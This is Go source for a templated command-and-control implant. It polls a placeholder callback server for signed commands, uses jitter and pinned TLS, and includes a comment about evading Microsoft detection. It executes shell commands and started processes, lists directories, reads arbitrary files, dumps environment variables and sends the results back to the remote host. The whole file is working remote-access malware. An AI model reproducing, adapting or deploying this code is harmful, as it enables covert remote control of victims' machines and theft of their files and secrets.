package main

import (
	"crypto"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"time"

	"golang.org/x/crypto/chacha20poly1305"
)

func DetermineGroups() ([]string, error) {
	gid, _ := os.Getgroups()
	var groups []string
	for i := 0; i < len(gid); i++ {
		stringID := fmt.Sprint(gid[i])
		id, err := user.LookupGroupId(stringID)
		if err != nil {
			return nil, err
		}
		groups = append(groups, id.Name)
	}
	return groups, nil
}

func StrH(s string) uint32 {
	var h uint32
	for _, c := range s {
		h = (h << 5) + uint32(c)
	}
	return h
}

func chacha(pass string, msg string) (enc_block []byte) {

	key := sha256.Sum256([]byte(pass))
	aead, _ := chacha20poly1305.NewX(key[:])

	nonce := make([]byte, chacha20poly1305.NonceSizeX)
	enc_block = aead.Seal(nil, nonce, []byte(msg), nil)
	return

}

func terminal(command string) (res string) {
	toRun := exec.Command(command)
	out, _ := toRun.Output()

	res = string(out)
	return
}

func readDir(path string) (contents string) {
	files, _ := os.ReadDir(path)

	for _, file := range files {
		contents += file.Name()
		contents += ", "
	}
	return
}

func runCommand(path string) (PID string) {
	//starts a process and returns the PID of it
	procAttr := new(os.ProcAttr)
	procAttr.Files = []*os.File{os.Stdin, os.Stdout, os.Stderr}
	if process, err := os.StartProcess(path, nil, procAttr); err != nil {

	} else {
		PID = fmt.Sprint(PID, process.Pid)
	}
	return
}

func getCurrentDir() (mydir string) {
	mydir, err := os.Getwd()
	if err != nil {
		mydir = "err on getting dir"
	}
	return
}

func getCurrentUser() (name string) {
	user, err := user.Current()
	if err != nil {
		name = "err on getting username"
	}
	name = user.Username
	return
}

var expectedFingerprint uint32

func main() {
    const serverCert = "-----BEGIN CERTIFICATE-----\n{{.ServerKey}}\n-----END CERTIFICATE-----"

	const pubKeyPEM = "-----BEGIN PUBLIC KEY-----\n{{.Pubkey}}\n-----END PUBLIC KEY-----"
	PEMBlock, _ := pem.Decode([]byte(pubKeyPEM))
	if PEMBlock == nil {
		os.Exit(0)
	}
	if PEMBlock.Type != "PUBLIC KEY" {
		os.Exit(0)
	}
	pubkey, err2 := x509.ParsePKIXPublicKey(PEMBlock.Bytes)
	if err2 != nil {
		os.Exit(0)
	}

	uuid := strings.ToUpper("{{.UUID}}")
	// Construct the client for requests, we define nothing right now but in the future can add functionality
	//client := &http.Client{}
	expectedFingerprint = {{.Fingerprint}}
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true, // Set to false to enforce certificate verification
				VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
					// Extract the peer certificate from the raw certificates
					peerCert, err := x509.ParseCertificate(rawCerts[0])
					if err != nil {
						return err
					}

					// Calculate the fingerprint of the certificate
					actualFingerprint := sha256.Sum256(peerCert.Raw)

					actualFingerprintStr := hex.EncodeToString(actualFingerprint[:])
					h1 := StrH(actualFingerprintStr)
					// Compare the actual fingerprint with the expected one

					if h1 != expectedFingerprint {
						os.Exit(0)
					}

					// Certificate is valid, no error
					return nil
				},
			},
		},
	}

	for true {
		ran := rand.New(rand.NewSource(time.Now().UnixNano()))
		rng := rand.New(ran)
		jitter := rng.Intn({{.Jitter}}) + 1
		sleepTime := {{.Sleep}} + jitter
		
		req, err := http.NewRequest("GET", "{{.CallBack}}/session", nil)
		req.Header.Add("APPSESSIONID", uuid)
		resp, err := client.Do(req)
		body, err := io.ReadAll(resp.Body)

		sb := string(body)
		sb = strings.TrimSuffix(sb, "\n")
		if sb == "" {
			for sb == "" { // An empty string represents a nil response body
				time.Sleep(time.Duration(sleepTime) * time.Second)
				req, err = http.NewRequest("GET", "{{.CallBack}}/session", nil)
				req.Header.Add("APPSESSIONID", uuid)
				resp, _ := client.Do(req)
				body, _ := io.ReadAll(resp.Body)
				sb = string(body)
				sb = strings.TrimSuffix(sb, "\n")
			}
		}

		// We reassign the string body to a new variable because otherwise Microsoft picks up that we're passing an HTML request right to be executed
		//string_contents := strings.Replace(sb, "\n", "", -1) // we get the command back with a \n which fucks up execution, strip it with this
		string_contents := strings.Fields(sb) // idk how I never heard of the Fields method

		h := sha256.New()
		h.Write([]byte(sb))
		// After verifying we have a command to execute, we now need to grab the commands signature
		// This is stored in a header value of the request
		rawSignature := resp.Header.Get("Verifier")
		signature, _ := hex.DecodeString(rawSignature)
		err = rsa.VerifyPKCS1v15(pubkey.(*rsa.PublicKey), crypto.SHA256, h.Sum(nil), signature)
		if err != nil {
			time.Sleep(time.Duration(sleepTime) * time.Second)
			req, _ = http.NewRequest("GET", "{{.CallBack}}/session", nil)
			req.Header.Add("APPSESSIONID", uuid)
			resp, _ = client.Do(req)
			body, _ := io.ReadAll(resp.Body)
			sb = string(body)
		}

		// We are turning this into a switch statement
		// We need to append the results of these functions to the result string
		// Then we send it
		result := ""
		switch string_contents[0] {
		case "pwd":
			result = getCurrentDir()
		case "gcu":
			result = getCurrentUser()
		case "rc":
			result = runCommand(string_contents[1])
		case "rd":
			result = readDir(string_contents[1])
		case "terminal":
			commandToRun := strings.Join(string_contents, ",")
			result = terminal(commandToRun)
		case "groups_id":
			res, err := DetermineGroups()
			if err != nil {
				result = err.Error()
			}
			if err == nil {
				result = strings.Join(res, "")
			}
		case "groups":
			vars, err := os.Getgroups()
			if err != nil {
				result = "error getting group info %e" + err.Error()
			}
			if err == nil {
				strAr := make([]string, len(vars))
				for i, num := range vars {
					strAr[i] = strconv.Itoa(num)
				}
				result = strings.Join(strAr, "")
			}
		case "read_file":
			contents, err := os.ReadFile(string_contents[1])
			if err != nil {
				result = "error reading file %e" + err.Error()
			}
			if err == nil {
				result = string(contents)
			}
		case "pid":
			pid := os.Getpid()
			result = fmt.Sprint(pid)
		case "environment":
			vars := os.Environ()
			result = strings.Join(vars, "")
		case "setenv":
			err := os.Setenv(string_contents[1], string_contents[2])
			if err != nil {
				result = err.Error()
			}
			if err == nil {
				result = "Set env var"
			}
		case "remove_var":
			err := os.Unsetenv(string_contents[1])
			if err != nil {
				result = err.Error()
			}
			if err == nil {
				result = "Removed env var"
			}
		case "fing":
			expectedFingerprint = StrH(string_contents[1])

		}

		toSend := string(result)
		toSend = strings.Replace(toSend, "\n", "", -1)

		time.Sleep(time.Duration(sleepTime) * time.Second)
		req, err = http.NewRequest("GET", "{{.CallBack}}/schema", strings.NewReader(string(toSend)))
		req.Header = http.Header{"APPSESSIONID": {uuid}}
		resp, err = client.Do(req)
		if err != nil {
			os.Exit(0)
		}
	}

}
